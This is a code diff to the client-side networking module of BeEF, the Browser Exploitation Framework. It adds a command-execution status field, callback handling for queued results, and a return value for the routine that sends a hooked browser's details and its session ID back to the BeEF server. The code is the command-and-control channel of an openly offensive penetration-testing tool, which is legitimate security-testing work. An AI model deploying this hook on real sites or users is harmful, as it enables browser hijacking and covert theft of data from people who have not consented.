@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -35,6 +35,7 @@ beef.net = {
     command: function () {
         this.cid = null;
         this.results = null;
+        this.status = null;
         this.handler = null;
         this.callback = null;
     },
@@ -84,13 +85,15 @@ beef.net = {
      * @param: {String} handler: the server-side handler that will be called
      * @param: {Integer} cid: command id
      * @param: {String} results: the data to send
+     * @param: {Integer} status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
      * @param: {Function} callback: the function to call after execution
      */
-    queue: function (handler, cid, results, callback) {
+    queue: function (handler, cid, results, status, callback) {
         if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
             var s = new beef.net.command();
             s.cid = cid;
             s.results = beef.net.clean(results);
+            s.status = status;
             s.callback = callback;
             s.handler = handler;
             this.cmd_queue.push(s);
@@ -105,22 +108,32 @@ beef.net = {
      * @param: {String} handler: the server-side handler that will be called
      * @param: {Integer} cid: command id
      * @param: {String} results: the data to send
+     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
      * @param: {Function} callback: the function to call after execution
+     * @return: {Integer} exec_status: the command module execution status (defaults to 0 - 'unknown' if status is null)
      */
-    send: function (handler, cid, results, callback) {
+    send: function (handler, cid, results, exec_status, callback) {
+        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
+        var status = 0;
+        if (exec_status != null && parseInt(Number(exec_status)) == exec_status){ status = exec_status}
+
         if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
-            this.queue(handler, cid, results, callback);
+            this.queue(handler, cid, results, status, callback);
             this.flush();
         } else {
             try {
                 beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                     '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
-                    '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
+                    '", "status": "' + exec_status +
+                    '", "callback": "' + callback +
+                    '","bh":"' + beef.session.get_hook_session_id() + '" }');
             } catch (e) {
-                this.queue(handler, cid, results, callback);
+                this.queue(handler, cid, results, status, callback);
                 this.flush();
             }
         }
+
+        return status;
     },
 
     /**
@@ -131,7 +144,7 @@ beef.net = {
      * XHR-polling mechanism. If WebSockets are used, the data is sent
      * back to BeEF straight away.
      */
-    flush: function () {
+    flush: function (callback) {
         if (this.cmd_queue.length > 0) {
             var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
             this.cmd_queue.length = 0;
@@ -149,7 +162,11 @@ beef.net = {
                     stream.packets.push(packet);
                 }
                 stream.pc = stream.packets.length;
-                this.push(stream);
+                this.push(stream, callback);
+            }
+        } else {
+            if ((typeof callback != 'undefined') && (callback != null)) {
+                callback();
             }
         }
     },
@@ -169,10 +186,18 @@ beef.net = {
      * It uses beef.net.request to send back the data.
      * @param: {Object} stream: the stream object to be sent back.
      */
-    push: function (stream) {
+    push: function (stream, callback) {
         //need to implement wait feature here eventually
+        if (typeof callback === 'undefined') {
+            callback = null;
+        }
         for (var i = 0; i < stream.pc; i++) {
-            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
+            var cb = null;
+            if (i == (stream.pc - 1)) {
+                cb = callback;
+            }
+            this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, 
+                    stream.get_packet_data(), 10, 'text', cb);
         }
     },
 
@@ -477,8 +502,13 @@ beef.net = {
      */
     browser_details: function () {
         var details = beef.browser.getDetails();
+        var res = null;
         details['HookSessionID'] = beef.session.get_hook_session_id();
         this.send('/init', 0, details);
+        if(details != null)
+            res = true;
+
+        return res;
     }
 
 };
